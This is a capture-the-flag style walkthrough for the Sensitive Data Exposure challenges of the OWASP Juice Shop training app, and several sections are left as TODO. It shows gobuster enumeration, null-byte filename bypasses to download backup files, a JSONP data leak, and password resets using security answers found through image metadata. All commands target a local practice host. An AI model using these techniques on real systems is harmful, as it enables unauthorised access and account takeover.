# Sensitive Data Exposure

## Access Log

Wordlists
* https://github.com/danielmiessler/SecLists
* https://github.com/v0re/dirb/tree/master/wordlists
* https://gitlab.com/kalilinux/packages/dirbuster

Gain access to any access log file of the server

```bash
# status code is rigged (always 200 instead of 404): ignore 200 with fixed size and add delay to avoid crashing the server
gobuster dir -u http://juiceshop:3000/ \
  -w /hck/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  --exclude-length 3748 -t 1 --delay 50ms
# output
# /.well-known/security.txt (Status: 200) [Size: 403]
# /api                  (Status: 500) [Size: 3017]
# /assets               (Status: 301) [Size: 179] [--> /assets/]
# /ftp                  (Status: 200) [Size: 11072]
# /profile              (Status: 500) [Size: 1159]
# /promotion            (Status: 200) [Size: 6586]
# /redirect             (Status: 500) [Size: 3119]
# /rest                 (Status: 500) [Size: 3019]
# /robots.txt           (Status: 200) [Size: 28]
# /security.txt         (Status: 200) [Size: 403]
# /snippets             (Status: 200) [Size: 792]
# /video                (Status: 200) [Size: 10075518]

# challenge description suggests "support" team from "/ftp/" path
curl -O juiceshop:3000/ftp/incident-support.kdbx

gobuster fuzz -u http://juiceshop:3000/support/FUZZ \
  -w /hck/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  --exclude-length 3748 -t 1 --delay 50ms

curl "http://juiceshop:3000/support/logs/access.log.$(date '+%Y-%m-%d')"
```

## Confidential Document

Access a confidential document

```bash
# http://juiceshop:3000/ftp/order_<ORDER_ID>.pdf
curl -O http://juiceshop:3000/ftp/acquisitions.md
```

## Email Leak

* [Wikipedia JSONP](https://en.wikipedia.org/wiki/JSONP)

Perform an unwanted information disclosure by accessing data cross-domain

```bash
http http://juiceshop:3000/rest/user/whoami
# {"user":{}}

# auth is ignored
http http://juiceshop:3000/rest/user/whoami?callback=foo
# /**/ typeof foo === 'function' && foo({"user":{}});
```

## Exposed Metrics

* [Prometheus](https://prometheus.io/docs/introduction/overview)

Find the endpoint that serves usage data to be scraped by a popular monitoring system

```bash
http http://juiceshop:3000/metrics
```

## Forgotten Developer Backup

* [Null byte attacks are alive and well](https://portswigger.net/blog/null-byte-attacks-are-alive-and-well)
* [Common PHP attacks: Poison Null Byte](https://defendtheweb.net/article/common-php-attacks-poison-null-byte)

Access a developer's forgotten backup file

```bash
# %00 -> url encoded %2500
curl http://juiceshop:3000/ftp/package.json.bak%2500.md
```

## Forgotten Sales Backup

Access a salesman's forgotten backup file

```bash
curl http://juiceshop:3000/ftp/coupons_2013.md.bak%2500.pdf
```

## GDPR Data Theft

Steal someone else's personal data without using Injection

```bash
TODO
```

## Leaked Access Logs

Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to

```bash
TODO
```

## Leaked Unsafe Product

Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous

```bash
TODO
```

## Login Amy

Log in with Amy's original user credentials

```bash
# husband: Kif Kroker
# https://futurama.fandom.com/wiki/Amy_Wong-Kroker

# The challenge description contains a few sentences which give away some information how Amy decided to strengthen her password.
# (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note")
# https://www.grc.com/haystack.htm

http http://juiceshop:3000/rest/user/login email="amy@juice-sh.op" password="K1f....................."
```

## Login MC SafeSearch

Log in with MC SafeSearch's original user credentials

```bash
# https://www.youtube.com/watch?v=v59CX2DiX0Y
http http://juiceshop:3000/rest/user/login email="mc.safesearch@juice-sh.op" password="Mr. N00dles"
```

## Meta Geo Stalking

Determine the answer to John's security question

```bash
curl -sS -O http://juiceshop:3000/assets/public/images/uploads/favorite-hiking-place.png

# GPS Position
exiftool favorite-hiking-place.png

# convert https://gps-coordinates.org/coordinate-converter.php
# DMS (degrees, minutes, seconds): 36 deg 57' 31.38" N, 84 deg 20' 53.58" W
# DD (decimal degrees): 36.95871666666667, -84.34821666666666
# address: 1–251 Two Bridge Rd, London, KY 40744, United States

# security question: What's your favorite place to go hiking?
curl -sS http://juiceshop:3000/rest/user/reset-password \
  -H 'Content-Type: application/json' \
  --data-raw '{"email":"john@juice-sh.op","answer":"Daniel Boone National Forest","new":"12345","repeat":"12345"}'
```

## Misplaced Signature File

Access a misplaced SIEM signature file.
```bash
TODO
```

## NFT Takeover

Take over the wallet containing our official Soul Bound Token (NFT).

```bash
TODO missing
```

## Reset Uvogin's Password

Reset Uvogin's password via the Forgot Password mechanism

```bash
TODO
```

## Retrieve Blueprint

Deprive the shop of earnings by downloading the blueprint for one of its products

```bash
TODO
```

## Visual Geo Stalking

Determine the answer to Emma's security question

```bash
curl -sSO http://juiceshop:3000/assets/public/images/uploads/IMG_4253.jpg

# try google upload https://images.google.com

# security question: Company you first work for as an adult?
curl -sS http://juiceshop:3000/rest/user/reset-password \
  -H 'Content-Type: application/json' \
  --data-raw '{"email":"emma@juice-sh.op","answer":"ITsec","new":"12345","repeat":"12345"}'
```
